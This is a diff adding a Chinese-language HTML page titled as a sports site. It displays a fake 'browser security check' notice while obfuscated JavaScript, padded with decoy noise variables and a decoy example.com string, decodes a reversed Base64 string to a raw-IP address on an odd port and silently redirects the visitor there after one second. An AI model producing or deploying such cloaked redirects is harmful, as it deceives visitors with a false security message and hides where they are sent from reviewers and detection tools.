@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>综合体育</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            display: flex; 
+            flex-direction: column;  /* 改为垂直排列 */
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            background-color: #f0f0f0; 
+        }
+        .msg { 
+            text-align: center; 
+            font-size: 18px; 
+            color: #333;
+            margin: 10px 0;  /* 增加上下边距分隔消息 */
+        }
+    </style>
+<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+<script>LA.init({id:"3MSqL1y2KxCMNkdM",ck:"3MSqL1y2KxCMNkdM"})</script>
+</head>
+<body>
+    <div class="msg"><p>浏览器安全性检查...</p></div>
+    <div class="msg"><p>推荐使用谷歌或Edge浏览器...</p></div>
+    <script>
+        // 数据干扰
+        const _0xFake = () => { return Math.random() * 1000 + "fake"; };
+        const _0xNoise = ["dummy", "noise", "干扰数据", _0xFake()];
+
+        // 多层加密：
+        const _0xKey = 0; // 偏移密钥（无偏移）
+        const _0xEncoded = "=ogN3cTMyojM3EjL1gTMucDMy4COz8yL6MHc0RHa"; // 反Base64
+        const _0xPart1 = "ht"; // 假
+        const _0xPart2 = "tps://exa"; // 假2
+        const _0xPart3 = "mple.com"; // 假3
+
+        // 解密与动态生成函数
+        const _0xDecode = (str, key) => {
+            let _0xResult = "";
+            for (let i = 0; i < str.length; i++) {
+                _0xResult += String.fromCharCode(str.charCodeAt(i) - key);
+            }
+            return _0xResult.split("").reverse().join("");
+        };
+
+        // 主逻辑
+        const _0xJump = () => {
+            // 假数干
+            let _0xTemp = _0xNoise[2] + _0xFake();
+            if (_0xTemp.length > 0) _0xTemp = "useless";
+
+            // 动态生成真实 URL
+            const _0xStep1 = _0xPart1 + _0xPart2 + _0xPart3;
+            const _0xStep2 = atob(_0xDecode(_0xEncoded, _0xKey));
+            const _0xRealUrl = _0xStep1.length > 10 ? _0xStep2 : "error";
+
+            // 延时跳转
+            setTimeout(() => {
+                try {
+                    window.location.href = _0xRealUrl;
+                } catch (_0xErr) {
+                    console.error("Err", _0xErr);
+                    document.querySelector(".msg").innerHTML = "<p>跳转失败</p>";
+                }
+            }, 1000);
+        };
+
+        // 添加假环干扰
+        for (let i = 0; i < 5; i++) { _0xFake(); }
+
+        // 执行
+        _0xJump();
+    </script>
+</body>
+</html>
